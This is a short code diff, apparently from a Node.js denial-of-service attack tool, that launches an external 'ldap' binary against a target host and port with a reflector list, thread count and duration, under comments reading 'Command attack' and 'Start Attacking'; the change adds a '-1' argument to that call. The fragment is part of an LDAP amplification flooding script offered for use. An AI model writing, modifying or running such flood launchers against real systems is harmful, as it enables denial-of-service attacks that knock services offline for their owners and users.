@@ -25,7 +25,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`./ldap ${host} ${port} ldap.txt 100 ${duration}`, (error, stdout, stderr) => {
+exec(`./ldap ${host} ${port} ldap.txt 100 -1 ${duration}`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
